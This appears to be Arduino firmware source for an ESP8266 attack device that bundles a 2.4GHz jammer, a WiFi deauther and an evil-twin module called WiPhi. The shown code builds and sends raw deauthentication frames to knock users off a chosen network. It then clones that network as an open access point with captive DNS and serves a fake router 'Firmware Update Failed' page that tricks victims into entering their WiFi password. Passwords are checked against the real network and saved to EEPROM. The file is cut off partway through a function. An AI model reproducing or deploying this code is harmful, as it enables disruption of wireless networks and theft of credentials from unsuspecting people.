/* =====================
   Launcher — RF-Hunter + Deauther Suite + WiPhi
   WiPhi integrated as a full AppMode (no separate sketch needed)
   ===================== */

extern "C" {
  #include "user_interface.h"
}

#include <SPI.h>
#include <RF24.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

#include "EEPROMHelper.h"
#include "src/ArduinoJson-v5.13.5/ArduinoJson.h"
#if ARDUINOJSON_VERSION_MAJOR != 5
#error Please upgrade/downgrade ArduinoJSON library to version 5!
#endif

#include "oui.h"
#include "language.h"
#include "functions.h"
#include "settings.h"
#include "Names.h"
#include "SSIDs.h"
#include "Scan.h"
#include "Attack.h"
#include "CLI.h"
#include "DisplayUI.h"
#include "A_config.h"

// ============================================================
//  Hardware
// ============================================================
#define PIN_CE   16
#define PIN_CSN  15

// ============================================================
//  WiPhi EEPROM layout
//  Placed at a high offset to avoid colliding with the deauther.
//  Deauther typically uses 0-~1800 bytes.
//  WiPhi uses 2000 onward.
//  5 slots × (1 valid + 32 ssid + 64 pw) = 485 bytes → fits well
// ============================================================
#define WP_EE_MAGIC       0xBC
#define WP_EE_MAGIC_ADDR  2000
#define WP_EE_SLOTS       5
#define WP_EE_SSID_LEN    32
#define WP_EE_PW_LEN      64
#define WP_EE_SLOT_SIZE   (1 + WP_EE_SSID_LEN + WP_EE_PW_LEN)
#define WP_EE_DATA_START  2001
#define WP_EE_TOTAL       (WP_EE_DATA_START + WP_EE_SLOTS * WP_EE_SLOT_SIZE)

struct WP_SavedPW {
    bool valid;
    char ssid[WP_EE_SSID_LEN];
    char pw[WP_EE_PW_LEN];
};

void wpEeWrite(int slot, const WP_SavedPW& s) {
    int base = WP_EE_DATA_START + slot * WP_EE_SLOT_SIZE;
    EEPROM.write(base, s.valid ? 1 : 0);
    for (int i = 0; i < WP_EE_SSID_LEN; i++) EEPROM.write(base + 1 + i,                s.ssid[i]);
    for (int i = 0; i < WP_EE_PW_LEN;   i++) EEPROM.write(base + 1 + WP_EE_SSID_LEN + i, s.pw[i]);
    EEPROM.commit();
}

WP_SavedPW wpEeRead(int slot) {
    WP_SavedPW s;
    int base = WP_EE_DATA_START + slot * WP_EE_SLOT_SIZE;
    s.valid = (EEPROM.read(base) == 1);
    for (int i = 0; i < WP_EE_SSID_LEN; i++) s.ssid[i] = EEPROM.read(base + 1 + i);
    for (int i = 0; i < WP_EE_PW_LEN;   i++) s.pw[i]   = EEPROM.read(base + 1 + WP_EE_SSID_LEN + i);
    s.ssid[WP_EE_SSID_LEN - 1] = 0;
    s.pw[WP_EE_PW_LEN   - 1] = 0;
    return s;
}

void wpEeDelete(int slot) {
    WP_SavedPW e; e.valid = false;
    memset(e.ssid, 0, WP_EE_SSID_LEN);
    memset(e.pw,   0, WP_EE_PW_LEN);
    wpEeWrite(slot, e);
}

int wpEeSave(const char* ssid, const char* pw) {
    for (int i = 0; i < WP_EE_SLOTS; i++) {
        WP_SavedPW s = wpEeRead(i);
        if (!s.valid) {
            WP_SavedPW n; n.valid = true;
            strncpy(n.ssid, ssid, WP_EE_SSID_LEN - 1); n.ssid[WP_EE_SSID_LEN - 1] = 0;
            strncpy(n.pw,   pw,   WP_EE_PW_LEN   - 1); n.pw[WP_EE_PW_LEN   - 1] = 0;
            wpEeWrite(i, n);
            return i;
        }
    }
    return -1;
}

// ============================================================
//  WiPhi network struct
// ============================================================
typedef struct {
    String  ssid;
    uint8_t ch;
    uint8_t bssid[6];
    int32_t rssi;
} WP_Network;

// ============================================================
//  AppMode enum
// ============================================================
enum class AppMode {
    MAIN_MENU,
    NRF_MENU,
    NRF_RUNNING,
    DEAUTHER_SUITE,
    WIPHI           // ← WiPhi fully integrated
};

// ============================================================
//  WiPhi sub-states
// ============================================================
typedef enum {
    WP_MAIN_MENU = 0,
    WP_SCANNING,
    WP_AP_LIST,
    WP_ATTACK_MENU,
    WP_RUNNING,
    WP_CAPTURED,
    WP_PW_LIST,
    WP_PW_DETAIL
} WP_State;

#define WP_MAIN_ITEMS 5
const char* WP_MAIN_LABELS[WP_MAIN_ITEMS] = {
    "Scan Networks",
    "Select AP",
    "Attack",
    "Captured PW",
    "Saved Passwords"
};

#define WP_ATK_ITEMS 4
const char* WP_ATK_LABELS[WP_ATK_ITEMS] = {
    "Deauth Only",
    "Deauth + EvilTwin",
    "Stop Attack",
    "Back"
};

// ── WiPhi globals ────────────────────────────────────────────
WP_Network  wp_networks[16];
WP_Network  wp_selected;
int         wp_networkCount  = 0;
bool        wp_hotspot       = false;
bool        wp_deauthing     = false;
unsigned long wp_deauthNow   = 0;
unsigned long wp_deauthCount = 0;
String      wp_correct       = "";
String      wp_tryPassword   = "";

const IPAddress  wp_apIP(192, 168, 4, 1);
const byte       wp_dnsPort = 53;
DNSServer        wp_dns;
ESP8266WebServer wp_web(80);

WP_State wp_state   = WP_MAIN_MENU;
int      wp_menuSel = 0;
int      wp_apSel   = 0;
int      wp_atkSel  = 0;
int      wp_pwSel   = 0;

bool wp_webStarted = false;

// ============================================================
//  NRF mode struct
// ============================================================
struct NrfMode {
    const char* label;
    void (*init)();
    void (*tick)();
    bool needsCarrier;
};

void nrfAttackAllInit();  void nrfAttackAllTick();
void nrfAttackWiFiInit(); void nrfAttackWiFiTick();

// ============================================================
//  Deauther / launcher globals
// ============================================================
Names       names;
SSIDs       ssids;
Accesspoints accesspoints;
Stations     stations;
Scan         scan;
Attack       attack;
CLI          cli;
DisplayUI    displayUI;
RF24         radio(PIN_CE, PIN_CSN);

#include "wifi.h"

uint32_t autosaveTime  = 0;
uint32_t currentTime   = 0;
bool     booted        = false;
bool     deautherStarted = false;
bool     nrfReady      = false;
bool     carrierActive = false;

AppMode appMode      = AppMode::MAIN_MENU;
int     mainSelected = 0;
int     nrfSelected  = 0;
int     activeNrfMode = -1;

const byte NRF_CARRIER_CH = 45;
const int  wifiChannels[] = { 12,13,14,15,16,17,18,19,20,21,22 };
const int  numWifiCh = sizeof(wifiChannels) / sizeof(wifiChannels[0]);

const char* MAIN_MENU_ITEMS[] = { "RF-Hunter", "Deauther-Suite", "WiPhi" };
const int   MAIN_MENU_COUNT   = 3;

const NrfMode NRF_MODES[] = {
    { "BLE & All 2.4GHz", nrfAttackAllInit,  nrfAttackAllTick,  true },
    { "Just Wi-Fi",       nrfAttackWiFiInit, nrfAttackWiFiTick, true },
};
const int NRF_MODE_COUNT = sizeof(NRF_MODES) / sizeof(NRF_MODES[0]);

// ============================================================
//  Forward declarations
// ============================================================
// Launcher
void updateButtons();
void drawMainMenu();
void drawNrfMenu();
void drawNrfRunning();
void drawNrfBootScreen();
void drawNrfError();
bool setupNrfRadio();
void startNrfMode(int idx);
void stopNrfMode();
void startCarrier();
void stopCarrier();
void startDeautherSuite();
void returnToMainMenu();
void updateMainMenu();
void updateNrfMenu();
void updateNrfRunning();
void updateDeautherSuite();

// WiPhi OLED
void wpTitleBar(const char* t);
void wpMenuItem(int y, bool sel, const char* label);
void wpDrawMain();
void wpDrawScanFrame(int p);
void wpDrawApList();
void wpDrawAtkMenu();
void wpDrawRunning();
void wpDrawCaptured();
void wpDrawPwList();
void wpDrawPwDetail(int slot);

// WiPhi logic
void wpPerformScan();
void wpStartDeauth();
void wpStopDeauth();
void wpStartEvilTwin();
void wpStopEvilTwin();
void wpTickDeauth();
void wpStartWeb();
void wpStopWeb();
void wpEnter();
void wpExit();
void updateWiPhi();

// WiPhi web
String wpBytesToStr(const uint8_t* b, uint32_t size);
String wpHeader(String t);
String wpIndexPage();
void   wpHandleIndex();
void   wpHandleResult();
void   wpHandleAdmin();

// ============================================================
// ══════════════════════════════════════════════════════════
//  WIPHI OLED DRAWING
//  Uses displayUI's internal SH1106Wire via displayUI.display
//  DisplayUI exposes: updatePrefix(), updateSuffix(), drawString()
//  For WiPhi pixel-level control we access displayUI.display directly.
// ══════════════════════════════════════════════════════════
// ============================================================

// Macro to access the display object inside DisplayUI
// DisplayUI stores it as a public member: OLEDDisplay* display
#define DISP (displayUI.display)

void wpTitleBar(const char* title) {
    DISP.fillRect(0, 0, 128, 12);
    DISP.setColor(BLACK);
    int xpos = (128 - (int)strlen(title) * 6) / 2;
    if (xpos < 2) xpos = 2;
    DISP.drawString(xpos, 1, title);
    DISP.setColor(WHITE);
}

void wpMenuItem(int y, bool sel, const char* label) {
    char row[28];
    snprintf(row, sizeof(row), "%s %s", sel ? ">" : " ", label);
    DISP.drawString(2, y, row);
}

void wpDrawMain() {
    DISP.clear();
    wpTitleBar("WiPhi");

    // AP line inside title bar (right side, inverted)
    if (wp_selected.ssid != "") {
        DISP.setColor(BLACK);
        String tag = wp_selected.ssid.substring(0, 8);
        DISP.drawString(128 - (int)tag.length() * 6 - 2, 1, tag.c_str());
        DISP.setColor(WHITE);
    }

    int visStart = (wp_menuSel >= 4) ? wp_menuSel - 3 : 0;
    for (int i = 0; i < 4; i++) {
        int idx = visStart + i;
        if (idx >= WP_MAIN_ITEMS) break;
        wpMenuItem(13 + i * 13, idx == wp_menuSel, WP_MAIN_LABELS[idx]);
    }
    if (visStart > 0)               DISP.drawString(122, 13, "^");
    if (visStart + 4 < WP_MAIN_ITEMS) DISP.drawString(122, 52, "v");

    // Status tags bottom right
    String st = "";
    if (wp_deauthing) st += "D";
    if (wp_hotspot)   st += "E";
    if (st.length())  DISP.drawString(128 - (int)st.length() * 6 - 2, 55, st.c_str());

    DISP.display();
}

void wpDrawScanFrame(int p) {
    DISP.clear();
    wpTitleBar("Scanning...");
    DISP.drawString(14, 16, "Scanning WiFi...");
    DISP.drawString(30, 30, "Please wait");
    DISP.drawRect(10, 44, 108, 9);
    int fill = (p * 106) / 100;
    if (fill > 0) DISP.fillRect(11, 45, fill, 7);
    DISP.display();
}

void wpDrawApList() {
    DISP.clear();
    wpTitleBar("Select AP");

    if (wp_networkCount == 0) {
        DISP.drawString(8, 20, "No networks found.");
        DISP.drawString(8, 34, "Scan first.");
        DISP.display();
        return;
    }

    int visStart = (wp_apSel >= 4) ? wp_apSel - 3 : 0;
    for (int i = 0; i < 4; i++) {
        int idx = visStart + i;
        if (idx >= wp_networkCount) break;
        String ssid = wp_networks[idx].ssid;
        if (ssid.length() > 13) ssid = ssid.substring(0, 12) + "~";
        char line[22];
        snprintf(line, sizeof(line), "%-13s c%d", ssid.c_str(), wp_networks[idx].ch);
        wpMenuItem(13 + i * 13, idx == wp_apSel, line);
    }
    if (visStart > 0)                    DISP.drawString(122, 13, "^");
    if (visStart + 4 < wp_networkCount)  DISP.drawString(122, 52, "v");

    char cnt[8];
    snprintf(cnt, sizeof(cnt), "%d/%d", wp_apSel + 1, wp_networkCount);
    DISP.drawString(128 - (int)strlen(cnt) * 6 - 1, 55, cnt);
    DISP.display();
}

void wpDrawAtkMenu() {
    DISP.clear();
    wpTitleBar("Attack");
    char tgt[20];
    snprintf(tgt, sizeof(tgt), "->%.16s", wp_selected.ssid.c_str());
    DISP.drawString(0, 13, tgt);
    for (int i = 0; i < WP_ATK_ITEMS; i++)
        wpMenuItem(24 + i * 10, i == wp_atkSel, WP_ATK_LABELS[i]);
    DISP.display();
}

void wpDrawRunning() {
    DISP.clear();
    wpTitleBar("Running");

    String mode;
    if (wp_deauthing && wp_hotspot) mode = "Deauth+EvilTwin";
    else if (wp_deauthing)         mode = "Deauth Only";
    else if (wp_hotspot)           mode = "EvilTwin Only";
    else                            mode = "Idle";
    DISP.drawString(0, 13, mode.c_str());

    char tgt[20];
    snprintf(tgt, sizeof(tgt), "->%.16s", wp_selected.ssid.c_str());
    DISP.drawString(0, 24, tgt);

    char pkts[18];
    snprintf(pkts, sizeof(pkts), "Pkts: %lu", wp_deauthCount);
    DISP.drawString(0, 35, pkts);

    if (wp_correct != "") {
        DISP.drawString(0, 46, "!! PW CAPTURED !!");
    } else if (wp_hotspot) {
        char cli[20];
        snprintf(cli, sizeof(cli), "Clients: %d", WiFi.softAPgetStationNum());
        DISP.drawString(0, 46, cli);
    }
    DISP.display();
}

void wpDrawCaptured() {
    DISP.clear();
    wpTitleBar("Captured!");
    if (wp_correct == "") {
        DISP.drawString(4, 18, "No password yet.");
        DISP.drawString(4, 32, "Run Deauth+EvilTwin");
        DISP.drawString(4, 46, "and wait.");
    } else {
        int sep = wp_correct.lastIndexOf(": ");
        String pw = (sep >= 0) ? wp_correct.substring(sep + 2) : wp_correct;
        char net[22];
        snprintf(net, sizeof(net), "Net:%.14s", wp_selected.ssid.c_str());
        DISP.drawString(0, 13, net);
        DISP.drawLine(0, 24, 128, 24);
        DISP.drawString(0, 26, "Password:");
        if (pw.length() > 14) {
            DISP.drawString(4, 37, pw.substring(0, 14).c_str());
            DISP.drawString(4, 49, pw.substring(14, 27).c_str());
        } else {
            DISP.drawString(4, 37, pw.c_str());
        }
    }
    DISP.display();
}

void wpDrawPwList() {
    DISP.clear();
    wpTitleBar("Saved PWs");
    int count = 0;
    for (int i = 0; i < WP_EE_SLOTS; i++) {
        WP_SavedPW s = wpEeRead(i);
        char row[22];
        if (s.valid) { snprintf(row, sizeof(row), "%.14s", s.ssid); count++; }
        else           snprintf(row, sizeof(row), "(empty)");
        wpMenuItem(13 + i * 10, i == wp_pwSel, row);
    }
    if (count == 0) DISP.drawString(8, 36, "No saved passwords.");
    DISP.display();
}

void wpDrawPwDetail(int slot) {
    DISP.clear();
    WP_SavedPW s = wpEeRead(slot);
    wpTitleBar("Password");
    if (!s.valid) { DISP.drawString(8, 24, "(empty slot)"); DISP.display(); return; }
    char net[22];
    snprintf(net, sizeof(net), "Net:%.14s", s.ssid);
    DISP.drawString(0, 13, net);
    DISP.drawLine(0, 24, 128, 24);
    DISP.drawString(0, 26, "PW:");
    String pw = String(s.pw);
    if (pw.length() > 14) {
        DISP.drawString(4, 36, pw.substring(0, 14).c_str());
        DISP.drawString(4, 47, pw.substring(14, 27).c_str());
    } else {
        DISP.drawString(4, 36, pw.c_str());
    }
    DISP.drawString(72, 55, "[BCK=DELETE]");
    DISP.display();
}

// ============================================================
// ══════════════════════════════════════════════════════════
//  WIPHI LOGIC
// ══════════════════════════════════════════════════════════
// ============================================================

String wpBytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += '0';
        str += String(b[i], HEX);
        if (i < size - 1) str += ':';
    }
    return str;
}

void wpPerformScan() {
    wifi_promiscuous_enable(0);
    WiFi.disconnect();
    delay(100);
    wpDrawScanFrame(0);
    int n = WiFi.scanNetworks(false);
    for (int i = 0; i < 16; i++) { wp_networks[i].ssid = ""; memset(wp_networks[i].bssid, 0, 6); }
    wp_networkCount = 0;
    if (n > 0) {
        wp_networkCount = min(n, 16);
        for (int i = 0; i < wp_networkCount; i++) {
            wp_networks[i].ssid = WiFi.SSID(i);
            wp_networks[i].ch   = WiFi.channel(i);
            wp_networks[i].rssi = WiFi.RSSI(i);
            for (int j = 0; j < 6; j++) wp_networks[i].bssid[j] = WiFi.BSSID(i)[j];
            wpDrawScanFrame(10 + (i * 90) / max(wp_networkCount, 1));
        }
    }
    wpDrawScanFrame(100);
    delay(300);
    wifi_promiscuous_enable(1);
}

void wpStartDeauth() { wp_deauthing = true; wp_deauthCount = 0; wp_deauthNow = 0; }
void wpStopDeauth()  { wp_deauthing = false; }

void wpStartEvilTwin() {
    wp_hotspot = true;
    wp_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(wp_apIP, wp_apIP, IPAddress(255,255,255,0));
    WiFi.softAP(wp_selected.ssid.c_str());
    wp_dns.start(wp_dnsPort, "*", wp_apIP);
}

void wpStopEvilTwin() {
    wp_hotspot = false;
    wp_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(wp_apIP, wp_apIP, IPAddress(255,255,255,0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    wp_dns.start(wp_dnsPort, "*", wp_apIP);
}

void wpTickDeauth() {
    if (!wp_deauthing || millis() - wp_deauthNow < 200) return;
    wifi_set_channel(wp_selected.ch);
    uint8_t pkt[26] = {
        0xC0,0x00,0x00,0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x01,0x00
    };
    memcpy(&pkt[10], wp_selected.bssid, 6);
    memcpy(&pkt[16], wp_selected.bssid, 6);
    pkt[24] = 1;
    pkt[0] = 0xC0; wifi_send_pkt_freedom(pkt, 26, 0);
    pkt[0] = 0xA0; wifi_send_pkt_freedom(pkt, 26, 0);
    wp_deauthCount++;
    wp_deauthNow = millis();
}

void wpStartWeb() {
    if (wp_webStarted) return;
    WiFi.softAPConfig(wp_apIP, wp_apIP, IPAddress(255,255,255,0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    wp_dns.start(wp_dnsPort, "*", wp_apIP);
    wp_web.on("/",       wpHandleIndex);
    wp_web.on("/result", wpHandleResult);
    wp_web.on("/admin",  wpHandleAdmin);
    wp_web.onNotFound(wpHandleIndex);
    wp_web.begin();
    wp_webStarted = true;
}

void wpStopWeb() {
    if (!wp_webStarted) return;
    wp_web.stop();
    wp_dns.stop();
    WiFi.softAPdisconnect(true);
    wp_webStarted = false;
}

// Called when entering WiPhi from main menu
void wpEnter() {
    // Stop deauther's WiFi stack cleanly
    if (deautherStarted) {
        attack.stop();
        scan.stop();
        wifi_promiscuous_enable(0);
    }

    // Reset WiPhi state
    wp_state       = WP_MAIN_MENU;
    wp_menuSel     = 0;
    wp_apSel       = 0;
    wp_atkSel      = 0;
    wp_pwSel       = 0;
    wp_correct     = "";
    wp_tryPassword = "";
    wp_deauthing   = false;
    wp_hotspot     = false;
    wp_deauthCount = 0;

    WiFi.mode(WIFI_AP_STA);
    wpStartWeb();

    // Initial scan
    wpPerformScan();
    wifi_promiscuous_enable(1);

    appMode = AppMode::WIPHI;
    displayUI.mode = DISPLAY_MODE::OFF;
    wpDrawMain();
}

// Called when leaving WiPhi (BACK held 5s or back from main)
void wpExit() {
    wpStopDeauth();
    wpStopEvilTwin();
    wpStopWeb();
    wp_webStarted = false;
}

// ============================================================
//  WiPhi web handlers
// ============================================================
#define WP_SUBTITLE "ACCESS POINT RESCUE MODE"
#define WP_TITLE    "<span style='color:yellow'>&#9888;</span> Firmware Update Failed"
#define WP_BODY     "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String wpHeader(String t) {
    String a = String(wp_selected.ssid);
    String CSS =
        "body{color:#333;font-family:'Century Gothic',sans-serif;font-size:18px;margin:0;padding:0}"
        "div{padding:0.5em}h1{font-size:7vw;padding:0.5em}"
        "input{width:100%;padding:9px;margin:8px 0;box-sizing:border-box;border:1px solid #555;border-radius:10px}"
        "label{color:#333;display:block;font-style:italic;font-weight:bold}"
        "nav{background:#0066ff;color:#fff;padding:1em}"
        "nav b{display:block;font-size:1.5em;margin-bottom:0.5em}";
    return "<!DOCTYPE html><html><head><title>" + a + "</title>"
           "<meta name=viewport content='width=device-width,initial-scale=1'>"
           "<style>" + CSS + "</style></head>"
           "<body><nav><b>" + a + "</b> " + WP_SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
}

String wpIndexPage() {
    return wpHeader(WP_TITLE) + "<div>" + WP_BODY +
           "</div><div><form action='/' method=post>"
           "<label>WiFi password:</label>"
           "<input type=password name='password' minlength='8'>"
           "<input type=submit value=Continue></form></div></body></html>";
}

String _wpAdminTpl =
    "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;padding:8px}.w{max-width:500px;margin:auto}"
    "table,th,td{border:1px solid #ccc;border-collapse:collapse;padding:4px 8px}"
    "button{padding:6px 12px;margin:4px}.sel{background:#90ee90}h3{color:green}</style>"
    "</head><body><div class='w'><h2>WiPhi</h2>"
    "<form style='display:inline' method='post' action='/?deauth={dv}'><button {dis}>{db}</button></form>"
    "<form style='display:inline' method='post' action='/?hotspot={hv}'><button {dis}>{hb}</button></form>"
    "<br><br><table><tr><th>SSID</th><th>Ch</th><th>RSSI</th><th></th></tr>";

void wpBuildAdmin(String& html) {
    for (int i = 0; i < 16; i++) {
        if (wp_networks[i].ssid == "") break;
        String bs   = wpBytesToStr(wp_networks[i].bssid, 6);
        bool   isSel = (wpBytesToStr(wp_selected.bssid, 6) == bs);
        html += "<tr><td>" + wp_networks[i].ssid + "</td><td>" +
                String(wp_networks[i].ch) + "</td><td>" + String(wp_networks[i].rssi) + "</td><td>"
                "<form method='post' action='/?ap=" + bs + "'>"
                "<button class='" + String(isSel ? "sel" : "") + "'>" +
                String(isSel ? "Selected" : "Select") + "</button></form></td></tr>";
    }
    html.replace("{db}",  wp_deauthing ? "Stop Deauth"   : "Start Deauth");
    html.replace("{dv}",  wp_deauthing ? "stop"          : "start");
    html.replace("{hb}",  wp_hotspot   ? "Stop EvilTwin" : "Start EvilTwin");
    html.replace("{hv}",  wp_hotspot   ? "stop"          : "start");
    html.replace("{dis}", wp_selected.ssid == "" ? "disabled" : "");
    if (wp_correct != "") html += "<h3>" + wp_correct + "</h3>";
    html += "</table></div></body></html>";
}

void wpHandleResult() {
    if (WiFi.status() != WL_CONNECTED) {
        wp_web.send(200, "text/html",
            "<html><head><script>setTimeout(()=>location.href='/',4000)</script></head>"
            "<body><center><h2 style='color:red'>Wrong Password. Try again.</h2></center></body></html>");
    } else {
        wp_correct = "PW for " + wp_selected.ssid + ": " + wp_tryPassword;
        wpEeSave(wp_selected.ssid.c_str(), wp_tryPassword.c_str());
        wpStopEvilTwin();
        wpStartEvilTwin();
        wp_state = WP_CAPTURED;
        wpDrawCaptured();
    }
}

void wpHandleIndex() {
    if (wp_web.hasArg("ap")) {
        for (int i = 0; i < 16; i++)
            if (wpBytesToStr(wp_networks[i].bssid, 6) == wp_web.arg("ap"))
                wp_selected = wp_networks[i];
    }
    if (wp_web.hasArg("deauth")) {
        if (wp_web.arg("deauth") == "start") wpStartDeauth();
        else                                   wpStopDeauth();
    }
    if (wp_web.hasArg("hotspot")) {
        if (wp_web.arg("hotspot") == "start") wpStartEvilTwin();
        else                                    wpStopEvilTwin();
        return;
    }
    if (wp_hotspot) {
        if (wp_web.hasArg("password")) {
            wp_tryPassword = wp_web.arg("password");
            delay(300);
            WiFi.disconnect();
            WiFi.begin(wp_selected.ssid.c_str(), wp_tryPassword.c_str(),
                       wp_selected.ch, wp_selected.bssid);
            wp_web.send(200, "text/html",
                "<html><head><script>setTimeout(()=>location.href='/result',15000)</script></head>"
                "<body><center><h2>Verifying... please wait</h2>"
                "<progress value='10' max='100'></progress></center></body></html>");
        } else {
            wp_web.send(200, "text/html", wpIndexPage());
        }
    } else {
        String html = _wpAdminTpl;
        wpBuildAdmin(html);
        wp_web.send(200, "text/html", html);
    }
}

void wpHandleAdmin() {
    if (wp_web.hasArg("ap")) {
        for (int i = 0; i < 16; i++)
            if (wpBytesToStr(wp_networks[i].bssid, 6) == wp_web.arg("ap"))
                wp_selected = wp_networks[i];
    }
    if (wp_web.hasArg("deauth")) {
        if (wp_web.arg("deauth") == "start") wpStartDeauth();
        else                                   wpStopDeauth();
    }
    if (wp_web.hasArg("hotspot")) {
        if (wp_web.arg("hotspot") == "start") wpStartEvilTwin();
        else                                    wpStopEvilTwin();
        return;
    }
    String html = _wpAdminTpl;
    wpBuildAdmin(html);
    wp_web.send(200, "text/html", html);
}

// ============================================================
// ══════════════════════════════════════════════════════════
//  WIPHI UPDATE (called every loop() when AppMode == WIPHI)
// ══════════════════════════════════════════════════════════
// ============================================================
void updateWiPhi() {
    // Service web + DNS every loop regardless of UI state
    wp_dns.processNextRequest();
    wp_web.handleClient();
    wpTickDeauth();

    updateButtons();
    if (!displayUI.upBtn) return;

    // Hold BACK 5s → return to launcher main menu
    if (displayUI.backHolding(5000)) {
        wpExit();
        returnToMainMenu();
        return;
    }

    bool upC    = displayUI.upBtn->clicked();
    bool downC  = displayUI.downBtn->clicked();
    bool enterC = displayUI.enterBtn->clicked();
    bool backC  = displayUI.backBtn->clicked();

    switch (wp_state) {

    // ── WiPhi main menu ──────────────────────────────────────
    case WP_MAIN_MENU: {
        bool chg = false;
        if (upC)   { wp_menuSel = (wp_menuSel + WP_MAIN_ITEMS - 1) % WP_MAIN_ITEMS; chg = true; }
        if (downC) { wp_menuSel = (wp_menuSel + 1) % WP_MAIN_ITEMS;                  chg = true; }
        if (chg) wpDrawMain();

        if (enterC) {
            switch (wp_menuSel) {
                case 0: // Scan
                    wpPerformScan();
                    wp_apSel = 0;
                    { // Brief result screen
                        DISP.clear(); wpTitleBar("WiPhi");
                        char f[24]; snprintf(f, sizeof(f), "Found %d network%s",
                            wp_networkCount, wp_networkCount == 1 ? "" : "s");
                        DISP.drawString(10, 26, f); DISP.display(); delay(900);
                    }
                    wpDrawMain();
                    break;
                case 1: // Select AP
                    wp_apSel = 0; wp_state = WP_AP_LIST; wpDrawApList(); break;
                case 2: // Attack
                    if (wp_selected.ssid == "") {
                        DISP.clear(); wpTitleBar("WiPhi");
                        DISP.drawString(8, 22, "No AP selected.");
                        DISP.drawString(8, 36, "Use Select AP first.");
                        DISP.display(); delay(1400); wpDrawMain();
                    } else {
                        wp_atkSel = 0; wp_state = WP_ATTACK_MENU; wpDrawAtkMenu();
                    }
                    break;
                case 3: // Captured
                    wp_state = WP_CAPTURED; wpDrawCaptured(); break;
                case 4: // Saved passwords
                    wp_pwSel = 0; wp_state = WP_PW_LIST; wpDrawPwList(); break;
            }
        }
    } break;

    // ── AP list ──────────────────────────────────────────────
    case WP_AP_LIST: {
        bool chg = false;
        if (upC   && wp_apSel > 0)                   { wp_apSel--; chg = true; }
        if (downC && wp_apSel < wp_networkCount - 1) { wp_apSel++; chg = true; }
        if (chg) wpDrawApList();

        if (enterC && wp_networkCount > 0) {
            wp_selected = wp_networks[wp_apSel];
            DISP.clear(); wpTitleBar("Selected!");
            char s[20]; snprintf(s, sizeof(s), "%.18s", wp_selected.ssid.c_str());
            DISP.drawString(4, 22, s);
            char c[16]; snprintf(c, sizeof(c), "Channel: %d", wp_selected.ch);
            DISP.drawString(4, 36, c); DISP.display(); delay(900);
            wp_atkSel = 0; wp_state = WP_ATTACK_MENU; wpDrawAtkMenu();
        }
        if (backC) { wp_state = WP_MAIN_MENU; wp_menuSel = 1; wpDrawMain(); }
    } break;

    // ── Attack menu ──────────────────────────────────────────
    case WP_ATTACK_MENU: {
        bool chg = false;
        if (upC)   { wp_atkSel = (wp_atkSel + WP_ATK_ITEMS - 1) % WP_ATK_ITEMS; chg = true; }
        if (downC) { wp_atkSel = (wp_atkSel + 1) % WP_ATK_ITEMS;                  chg = true; }
        if (chg) wpDrawAtkMenu();

        if (enterC) {
            switch (wp_atkSel) {
                case 0: wpStopEvilTwin(); wpStartDeauth();
                        wp_state = WP_RUNNING; wpDrawRunning(); break;
                case 1: wpStartDeauth(); wpStartEvilTwin();
                        wp_state = WP_RUNNING; wpDrawRunning(); break;
                case 2: wpStopDeauth(); wpStopEvilTwin();
                        wp_state = WP_MAIN_MENU; wp_menuSel = 2; wpDrawMain(); break;
                case 3: wp_state = WP_MAIN_MENU; wp_menuSel = 2; wpDrawMain(); break;
            }
        }
        if (backC) { wp_state = WP_MAIN_MENU; wp_menuSel = 2; wpDrawMain(); }
    } break;

    // ── Running ──────────────────────────────────────────────
    case WP_RUNNING: {
        static unsigned long lastDraw = 0;
        if (millis() - lastDraw > 500) { wpDrawRunning(); lastDraw = millis(); }
        if (wp_correct != "") { wp_state = WP_CAPTURED; wpDrawCaptured(); break; }
        if (backC || enterC) {
            wp_atkSel = 2; wp_state = WP_ATTACK_MENU; wpDrawAtkMenu();
        }
    } break;

    // ── Captured ─────────────────────────────────────────────
    case WP_CAPTURED: {
        if (backC || enterC) { wp_state = WP_MAIN_MENU; wp_menuSel = 3; wpDrawMain(); }
    } break;

    // ── Saved password list ──────────────────────────────────
    case WP_PW_LIST: {
        bool chg = false;
        if (upC   && wp_pwSel > 0)                  { wp_pwSel--; chg = true; }
        if (downC && wp_pwSel < WP_EE_SLOTS - 1)   { wp_pwSel++; chg = true; }
        if (chg) wpDrawPwList();
        if (enterC) {
            WP_SavedPW s = wpEeRead(wp_pwSel);
            if (s.valid) { wp_state = WP_PW_DETAIL; wpDrawPwDetail(wp_pwSel); }
        }
        if (backC) { wp_state = WP_MAIN_MENU; wp_menuSel = 4; wpDrawMain(); }
    } break;

    // ── Password detail  (ENTER=keep, BACK=delete) ───────────
    case WP_PW_DETAIL: {
        if (enterC) { wp_state = WP_PW_LIST; wpDrawPwList(); }
        if (backC)  { wpEeDelete(wp_pwSel); wp_state = WP_PW_LIST; wpDrawPwList(); }
    } break;

    default:
        wp_state = WP_MAIN_MENU; wpDrawMain(); break;
    }
}

// ============================================================
// ══════════════════════════════════════════════════════════
//  LAUNCHER — original code (mostly unchanged)
// ══════════════════════════════════════════════════════════
// ============================================================

void updateButtons() {
    if (!displayUI.upBtn) return;
    displayUI.upBtn->update();
    displayUI.downBtn->update();
    displayUI.leftBtn->update();
    displayUI.rightBtn->update();
    displayUI.enterBtn->update();
    displayUI.backBtn->update();
}

void drawMainMenu() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "Main Menu");
    for (int i = 0; i < MAIN_MENU_COUNT; i++) {
        String row = (i == mainSelected ? "> " : "  ");
        row += MAIN_MENU_ITEMS[i];
        displayUI.drawString(i + 1, row);
    }
    displayUI.updateSuffix();
}

void drawNrfBootScreen() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "RF Hunter");
    displayUI.drawString(1, "NRF-Functions");
    displayUI.drawString(2, "Initializing...");
    displayUI.updateSuffix();
}

void drawNrfError() {
    displayUI.updatePrefix();
